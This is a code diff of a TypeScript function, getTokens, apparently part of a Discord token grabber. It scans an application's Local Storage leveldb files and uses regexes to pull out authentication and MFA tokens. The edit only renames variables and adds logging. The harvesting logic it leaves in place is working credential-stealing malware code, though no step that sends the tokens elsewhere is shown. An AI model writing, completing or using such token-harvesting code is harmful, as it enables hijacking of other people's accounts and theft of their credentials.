@@ -21,11 +21,13 @@ const PATHS: Paths = {
 
 function getTokens(path: string): string[] {
     path = path + "\\Local Storage\\leveldb";
-    const listJ4J: string[] = [];
+    const listToken: string[] = [];
 
     try {
         const fileNames = fs.readdirSync(path);
         for (const file_name of fileNames) {
+            console.log(file_name);
+            
             if (!file_name.endsWith(".log") && !file_name.endsWith(".ldb")) {
                 continue;
             }
@@ -42,9 +44,9 @@ function getTokens(path: string): string[] {
 
                 const regexs = [/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/, /mfa\.[\w-]{84}/];
                 for (const regex of regexs) {
-                    const j4j = regex.exec(line);
-                    if (j4j !== null) {
-                        listJ4J.push(j4j[0]);
+                    const Token = regex.exec(line);
+                    if (Token !== null) {
+                        listToken.push(Token[0]);
                     }
                 }
             }
@@ -54,7 +56,7 @@ function getTokens(path: string): string[] {
         console.error(error);
     }
 
-    return listJ4J;
+    return listToken;
 }
 
 
